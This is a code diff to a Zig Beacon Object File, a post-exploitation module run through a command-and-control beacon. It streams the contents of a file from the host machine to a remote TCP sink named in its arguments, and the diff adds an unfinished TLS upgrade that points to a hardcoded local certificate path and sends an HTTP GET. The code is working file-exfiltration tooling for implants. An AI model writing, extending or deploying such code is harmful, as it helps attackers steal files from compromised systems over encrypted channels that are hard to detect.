@@ -2,12 +2,21 @@ const std = @import("std");
 const posix = @import("std").posix;
 const bofapi = @import("bof_api");
 const beacon = bofapi.beacon;
+const tls = @import("ianicTls");
 
 comptime {
     @import("bof_api").embedFunctionCode("memcpy");
     @import("bof_api").embedFunctionCode("memmove");
     @import("bof_api").embedFunctionCode("memset");
     @import("bof_api").embedFunctionCode("__stackprobe__");
+    @import("bof_api").embedFunctionCode("__divti3");
+    @import("bof_api").embedFunctionCode("__ashlti3");
+    @import("bof_api").embedFunctionCode("__udivdi3");
+    @import("bof_api").embedFunctionCode("__ashldi3");
+    @import("bof_api").embedFunctionCode("__aeabi_uldivmod");
+    @import("bof_api").embedFunctionCode("__aeabi_uidivmod");
+    @import("bof_api").embedFunctionCode("__aeabi_uidiv");
+    @import("bof_api").embedFunctionCode("__aeabi_llsl");
 }
 
 // BOF-specific error codes
@@ -42,6 +51,12 @@ fn checkAddressType(addr_type: []const u8) AddressType {
     }
     else
         return AddressType.UNRECOGNIZED;
+}
+
+fn pumpData(r_iface: *std.Io.Reader, w_iface: *std.Io.Writer) !usize {
+
+    const written = try r_iface.streamRemaining(w_iface);
+    return written;
 }
 
 pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
@@ -102,7 +117,30 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
             var tcp_buf: [4096]u8 = undefined;
             var tcp_w = tcp.writer(&tcp_buf);
 
-            _ = file_r_iface.streamRemaining(&tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
+            // Upgrade tcp connection to tls
+            if (sinkAddrType == AddressType.TLS) {
+                var tcp_buf_r: [4096]u8 = undefined;
+                var tcp_r = tcp.reader(&tcp_buf_r);
+
+                var root_ca = tls.config.cert.fromFilePathAbsolute(allocator, "/home/user/bf-bof-building/cert/minica.pem") catch return 94;
+                defer root_ca.deinit(allocator);
+
+                var diagnostic: tls.config.Client.Diagnostic = .{};
+
+                var conn = tls.client(tcp_r.interface(), &tcp_w.interface, .{
+                    .host = host,
+                    .root_ca = root_ca,
+                    .diagnostic = &diagnostic,
+                }) catch return 98;
+
+                var buf: [64]u8 = undefined;
+                const req = std.fmt.bufPrint(&buf, "GET / HTTP/1.1\r\nHost: {s}\r\n\r\n", .{host}) catch return 96;
+                conn.writeAll(req) catch return 97;
+                //_ = pumpData(file_r_iface, &tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
+                return 0;
+            }
+
+            _ = pumpData(file_r_iface, &tcp_w.interface) catch @intFromEnum(BofErrors.DataTransferError);
         }
     }
 
